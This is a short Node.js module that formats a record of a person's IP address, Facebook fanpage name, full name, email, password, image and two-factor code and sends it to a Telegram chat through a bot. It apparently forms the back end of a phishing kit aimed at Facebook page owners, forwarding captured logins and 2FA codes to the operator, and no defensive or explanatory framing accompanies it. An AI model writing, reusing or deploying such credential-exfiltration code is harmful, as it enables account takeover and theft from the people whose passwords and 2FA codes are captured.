require('dotenv').config();
const TelegramBot = require("node-telegram-bot-api");

const sendApi = (data,message) => {
    const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });

    const messageSend = `<strong>Status:</strong> ${message} !
<strong>--------------------------------------------</strong>
<strong>IP:</strong> ${data.ip ? data.ip : ''}
<strong>Fanpage:</strong> ${data.fanpageName ? data.fanpageName : ''} 
<strong>Name:</strong> ${data.fullName ? data.fullName : ''}
<strong>Email:</strong> ${data.email ? data.email : ''}
<strong>Password:</strong> ${data.password ? data.password : ''}
<strong>Image:</strong> ${data.image ? data.image : ''}
<strong>--------------------------------------------</strong>
<strong>Two-fa:</strong> ${data.two_fa ? data.two_fa : ''}`


    bot.sendMessage(process.env.CHAT_ID, messageSend,{parse_mode: 'HTML'});

}

module.exports = { sendApi }